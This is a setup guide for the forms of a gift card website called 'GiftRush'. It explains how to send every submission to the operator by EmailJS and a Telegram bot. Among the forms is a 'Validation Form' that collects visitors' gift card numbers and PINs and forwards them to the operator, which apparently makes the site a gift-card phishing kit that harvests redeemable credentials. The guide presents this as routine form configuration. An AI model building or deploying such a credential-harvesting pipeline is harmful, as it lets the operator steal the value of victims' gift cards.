# Form Submission Setup Guide - GiftRush

This guide explains how to configure email and Telegram notifications for all forms on your GiftRush website.

## 📋 Overview

All form submissions are now sent to:
1. **Email** - Using EmailJS (free tier available, no CORS issues)
2. **Telegram** - Using Telegram Bot API

## 🔧 Configuration Required

### 1. Email Setup (EmailJS) - RECOMMENDED

EmailJS has proper CORS support and works reliably from static websites.

**Step 1: Create EmailJS Account**
1. Go to https://www.emailjs.com/
2. Click "Sign Up Free"
3. Create your account (free tier includes 200 emails/month)

**Step 2: Add Email Service**
1. In EmailJS dashboard, go to **Email Services**
2. Click **Add New Service**
3. Select your email provider (e.g., Gmail, Outlook, or Custom SMTP)
4. Follow the connection steps
5. Note your **Service ID** (e.g., `service_abc123`)

**Step 3: Create Email Template**
1. Go to **Email Templates**
2. Click **Create New Template**
3. Use these variables in your template:
   ```
   {{name}}
   {{email}}
   {{subject}}
   {{message}}
   {{formType}}
   {{reply_to}}
   ```
4. For Buy Card form, also add:
   ```
   {{selectedCard}}
   {{amount}}
   {{fee}}
   {{total}}
   {{recipientName}}
   {{recipientEmail}}
   {{paymentMethod}}
   ```
5. For Validation form, also add:
   ```
   {{cardNumber}}
   {{pinCode}}
   {{cardBrand}}
   ```
6. Save and note your **Template ID** (e.g., `template_xyz789`)

**Step 4: Get Public Key**
1. Go to **Account** (click your name in top right)
2. Select **API Keys** from the menu
3. Copy your **Public Key** (e.g., `user_abc123`)

**Step 5: Update Configuration**
Open `form-handler.js` and update these values (lines ~28-30):

```javascript
const EMAILJS_PUBLIC_KEY = 'YOUR_PUBLIC_KEY_HERE'; // From Account > API Keys
const EMAILJS_SERVICE_ID = 'YOUR_SERVICE_ID_HERE'; // From Email Services
const EMAILJS_TEMPLATE_ID = 'YOUR_TEMPLATE_ID_HERE'; // From Email Templates
```

### 2. Telegram Setup

**Step 1: Create a Telegram Bot**
1. Open Telegram and search for `@BotFather`
2. Send `/newbot` command
3. Follow the prompts to name your bot
4. Copy the **BOT TOKEN** provided

**Step 2: Get Your Chat ID**
1. Search for `@userinfobot` on Telegram
2. Start a chat and send any message
3. Copy your **CHAT ID** (numeric value)

**Step 3: Update Configuration**
Open `form-handler.js` and update these values (lines ~33-34):

```javascript
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Paste your bot token
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Paste your chat ID
```

**Step 4: Add Bot to Channel (Optional)**
If you want notifications in a channel:
1. Add your bot as an administrator to the channel
2. Get the channel ID (e.g., `@channelname` or `-1001234567890`)
3. Use the channel ID as `TELEGRAM_CHAT_ID`

## 📝 Forms Configured

| Form | Location | Data Sent |
|------|----------|-----------|
| Contact Form | contact.html | Name, Email, Subject, Message |
| Validation Form | validate.html | Card Number, PIN, Brand |
| Buy Card Form | buy.html | Card, Amount, Fee, Total, Recipient Info |
| Newsletter | All pages | Email address |

## 📨 What You'll Receive

### Email Notifications (via EmailJS)
- Custom template with all form fields
- Reply-to set to sender's email
- Form type indicator
- Professional formatting

### Telegram Notifications
- Formatted message with emojis
- All form fields clearly labeled
- Timestamp
- Form type indicator

## 🔒 Security Notes

1. **HTTPS Required**: EmailJS requires HTTPS for production (use free SSL from hosting providers)
2. **Domain Restrictions**: In EmailJS dashboard, add your domain to allowed origins
3. **Rate Limiting**: Free tier has limits (200 emails/month, 50 requests/minute)
4. **Data Privacy**: Don't share your bot token or EmailJS credentials publicly

## 🧪 Testing

1. Open any HTML file in a browser (via local server or deployed site)
2. Fill out a form
3. Submit the form
4. Check:
   - Your email inbox (check spam folder initially)
   - Telegram bot messages

## ⚠️ Important Reminders

- Update `EMAILJS_PUBLIC_KEY`, `EMAILJS_SERVICE_ID`, and `EMAILJS_TEMPLATE_ID` in `form-handler.js`
- Update `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` in `form-handler.js`
- Test all forms after configuration
- Keep your credentials secure

## 🛠️ Troubleshooting

### Email not received?
- Check spam folder
- Verify EmailJS credentials are correct
- Check browser console for EmailJS errors
- Ensure domain is added to allowed origins in EmailJS dashboard
- Check EmailJS dashboard for delivery status

### Telegram not working?
- Verify bot token is correct
- Verify chat ID is correct (numeric, no @)
- Ensure bot is not blocked
- Check browser console for error messages
- Start a chat with your bot first (send /start)

### Forms not submitting?
- Open browser Developer Tools (F12)
- Check Console tab for errors
- Check Network tab for failed requests
- Ensure JavaScript is enabled
- Verify EmailJS SDK is loaded (check Network tab)

### CORS Errors?
- Make sure you're using EmailJS (not FormSubmit)
- EmailJS has built-in CORS support
- Check that EmailJS SDK is loaded before form-handler.js

## 📚 Additional Resources

- [EmailJS Documentation](https://www.emailjs.com/docs/)
- [EmailJS Free Tier](https://www.emailjs.com/pricing/)
- [Telegram Bot API](https://core.telegram.org/bots/api)
- [Getting Bot Token](https://core.telegram.org/bots#6-botfather)

## 🎯 Quick Start Checklist

1. ✅ Sign up at EmailJS.com
2. ✅ Add email service (Gmail, etc.)
3. ✅ Create email template with variables
4. ✅ Copy Public Key, Service ID, Template ID
5. ✅ Update form-handler.js with EmailJS credentials
6. ✅ Set up Telegram bot (optional)
7. ✅ Test all forms
8. ✅ Deploy to your hosting provider

---

**Note:** The EmailJS SDK (`email.min.js`) is already included in all HTML files. No additional setup needed!

**Need Help?** Check the browser console for error messages or review the configuration steps above.
